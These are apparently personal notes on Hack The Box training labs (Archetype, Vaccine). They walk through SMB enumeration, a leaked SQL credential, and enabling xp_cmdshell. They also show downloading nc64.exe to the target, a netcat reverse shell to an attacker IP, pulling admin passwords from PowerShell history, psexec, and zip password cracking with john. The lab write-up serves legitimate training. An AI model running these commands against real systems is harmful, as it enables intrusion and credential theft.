[[HTB-LABS]] [[Week4]]

# **Archetype**
this what i learn:
1. you can enter `smb` server by `smbclient` , and you can use those flages: `-N` mean **no password** . and can use `-L` to **List service or directory**
2. after we do this , there's some dir show and one of those is `backups` and to enter it
   we can use this command `smbclient -N \\\\{IP}\\backups` by this we will get shell and can use `dir` command to list what in there , then use `get` to download
3. when use `dir` you will find find file its name is `prod.dtsConfig`  and use get to download this file , then if you cat this file you will see code , in this code you will see username `ARCHETYPE\sql_svc` password `M3g4c0rp123` . this is the code 
```
   <DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>

```
4. we will use Impacket ```
```
Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.
```

5. we will use this script `mssqlclient.py` with this flaags `-windows-auth` :this flag is specified to use Windows Authentication .
   `python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth` by then the password and by that you'r connect to sql server and type `help` for help 
   Here's a great article that can guide us further to our exploration journey with MSSQL Server:
   https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

6. and from this cheat-sheet i will use this `SELECT is_srvrolemember('sysadmin');` continue using the cheat-sheet to see , from the command above the result is 1 and that mean it `true` which mean i'm admin or `sysadmin` .
7. after you know you'r admin use this script to enable shell
 ```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
8.  now we will use this file [ne64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) , but first we need to run Power-Shell because it better than normal command prompt , to do this we will use this command `xp_cmdshell "powershell -c command"`  replace `commnad` with any command you want to perform , i use `pwd` to know where we are , and this is the output `C:\Windows\system32` but we cannot write here , so after some enumeration i know that download will be great 
9. now we need to upload this  [ne64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) file , and for that we will use this 
   command `sudo python3 -m http.server 80` in our terminal , now in the server terminal do this command  `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.58:80/nc64.exe -outfile nc64.exe"` 
   by that we download this file to the server  and to make this file work we will use this command 
   `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.58 443"` by this we make the file work and give it our ip and the port 
   and you should run this on your terminal `nc -lnvp 443` 
10. boom!!! we get reverse shell to the main server, now we went to Desktop to find the user.txt flag , then go to power-shell history 
    `cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\`
    there we will find this file `ConsoleHost_history.txt` and that have the history of this powershell then perform this command `type ConsoleHost_history.txt` and you will get the user of the admin and the password 

11. after that you can use `psexec.py` from impacket to get in as admin and we use this `ali@Ali:~/impacket/impacket/examples$ sudo python3 psexec.py administrator@10.129.95.187` from that now we'r admin then just go to the admin's Desktop and you will find the root.txt, and done
12. we try to use winPEAS but idont know anything about it so we let it for letter ctf


# **Oopsie**
this what i learn:


# **Vaccine**
this what i learn:

1. the first task about ftb and other thing that we already cover .
2. we found file called `backup.zip` , it can be cat because of the password so we will need to crack it , we will use tool called `john the ripper` but before that we need to convert `backup.zip` to hashes and to do that , there's tool called `zip2john` (it comes with `john the ripper`) and to to that we will use command 
   `zip2john backup.zip > hashes` then use this command to crack it 
   `john --wordlist=/usr/share/wordlist/rockyou.txt hashes` and to show the result we will use this command `john --show hashes`
3. 